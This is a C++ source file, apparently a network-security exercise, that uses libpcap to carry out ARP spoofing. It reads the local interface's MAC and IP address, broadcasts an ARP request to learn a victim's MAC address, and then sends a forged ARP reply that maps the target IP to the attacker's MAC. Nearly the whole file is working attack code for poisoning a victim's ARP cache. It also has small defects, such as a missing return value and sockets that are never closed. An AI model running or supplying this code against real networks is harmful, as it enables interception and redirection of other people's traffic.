#include <sys/socket.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include "ethhdr.h"
#include "arphdr.h"

// https://web.mit.edu/freebsd/head/sys/net/ethernet.h 
#define	ETHER_ADDR_LEN		6	/* length of an Ethernet address */
#define	ETHER_TYPE_LEN		2	/* length of the Ethernet type field */
#define	ETHER_CRC_LEN		4	/* length of the Ethernet CRC */
#define	ETHER_HDR_LEN		(ETHER_ADDR_LEN*2+ETHER_TYPE_LEN)

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

int get_my_mac(char *if_name, char *dst, size_t dst_size) {
    struct ifreq s;
    u_char *mac;
    int fd;
    
    if((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP)) < 0)
        return -1;

    strncpy(s.ifr_name, if_name, IFNAMSIZ);
     
    if(ioctl(fd, SIOCGIFHWADDR, &s) < 0) {
        return -2;
    }

    mac = (u_char*)s.ifr_addr.sa_data;
    snprintf(dst, dst_size, "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return 0;
}



int get_my_ip(char *if_name, char *dst, size_t dst_size) {
    struct ifreq s;
    u_char *mac;
    int fd;
    
    if((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP)) < 0)
        return -1;
   
    strncpy(s.ifr_name, if_name, IFNAMSIZ);

    if(ioctl(fd, SIOCGIFADDR, &s) < 0) {
        return -2;
    }

    inet_ntop(AF_INET, (char*)s.ifr_addr.sa_data + sizeof(ushort), dst, dst_size);
    return 0;
}

int send_arp_packet(pcap_t *handle, int arp_op, Mac dmac, Mac smac, Mac tmac, Ip sip, Ip tip) {
    EthArpPacket packet;

    if(arp_op != ArpHdr::Request && arp_op != ArpHdr::Reply)
        return -1;

	packet.eth_.dmac_ = dmac;
	packet.eth_.smac_ = smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(arp_op);
	packet.arp_.smac_ = smac;
	packet.arp_.sip_ = htonl(sip);
	packet.arp_.tmac_ = tmac;
	packet.arp_.tip_ = htonl(tip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return -1;
	}

    return 0;
}


int proc_arp_attack(pcap_t *handle, char *my_mac, char *my_ip, char *sender_ip, char *target_ip) {
    Mac sender_mac;
    struct ArpHdr *arpHdr;

    if(send_arp_packet(handle,  ArpHdr::Request, Mac("ff:ff:ff:ff:ff:ff"), Mac(my_mac), Mac("00:00:00:00:00:00"), Ip(my_ip), Ip(sender_ip)) != 0)
        return -1;
    

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* pkt;
        int res = pcap_next_ex(handle, &header, &pkt);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        arpHdr = (struct ArpHdr*)(pkt + ETHER_HDR_LEN);
        if(arpHdr->op_ == htons(ArpHdr::Reply)) {
            memcpy(reinterpret_cast<uint8_t*>(&sender_mac), reinterpret_cast<uint8_t*>(&arpHdr->smac_), arpHdr->smac_.SIZE);
            break;
        }
    }

    if(send_arp_packet(handle,  ArpHdr::Reply, sender_mac, Mac(my_mac), sender_mac, Ip(target_ip), Ip(sender_ip)) != 0)
        return -1;

}